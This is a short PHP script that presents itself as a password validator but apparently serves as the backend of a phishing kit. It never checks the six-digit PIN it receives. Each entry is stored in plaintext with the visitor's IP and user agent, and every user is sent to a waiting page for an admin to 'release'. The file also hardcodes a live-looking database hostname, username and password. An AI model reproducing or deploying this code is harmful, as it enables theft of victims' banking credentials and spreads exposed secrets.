<?php
// processa.php — valida senha e controla fluxo

session_start();

// 🔐 Proteção: só aceita se veio da senha
if (!isset($_SESSION['cliente_id'])) {
    header('Location: login-desktop.php');
    exit;
}

// 🔒 Proteção: método correto
if ($_SERVER['REQUEST_METHOD'] !== 'POST' || empty($_POST['senha'])) {
    header('Location: senha.php');
    exit;
}

// --- CONEXÃO COM O BANCO ---
$DATABASE_URL = getenv("DATABASE_URL");
if (!$DATABASE_URL) {
    $DATABASE_URL = "host=cd7f19r8oktbkp.cluster-czrs8kj4isg7.us-east-1.rds.amazonaws.com port=5432 dbname=de3nhd2osd4jko user=u974ongr8md5qc password=p68932741a8bb7b2b28fced15dae4143f8721c875a7dfa625405c09b198d9c632";
}
$db = pg_connect($DATABASE_URL);

if (!$db) {
    die('Erro de conexão');
}

// --- JUNTA A SENHA ---
$senhaArray = $_POST['senha'];
$senha = implode('', array_map('trim', $senhaArray));

// 🔒 Validação básica
if (!preg_match('/^\d{6}$/', $senha)) {
    header('Location: senha.php?erro=senha');
    exit;
}

// --- SALVA A TENTATIVA (IMPORTANTE PARA ADMIN) ---
$now = gmdate("Y-m-d H:i:s");

pg_query_params(
    $db,
    "
    INSERT INTO tentativas_senha
    (cliente_id, senha_digitada, ip, user_agent, created_at)
    VALUES ($1, $2, $3, $4, $5)
    ",
    [
        $_SESSION['cliente_id'],
        $senha,
        $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0',
        $_SERVER['HTTP_USER_AGENT'] ?? 'Desconhecido',
        $now
    ]
);

// --- CONTROLE DE FLUXO ---
// 🔴 REGRA ATUAL: sempre vai para aguardar.php
// (admin libera depois)

header('Location: aguardar.php');
exit;
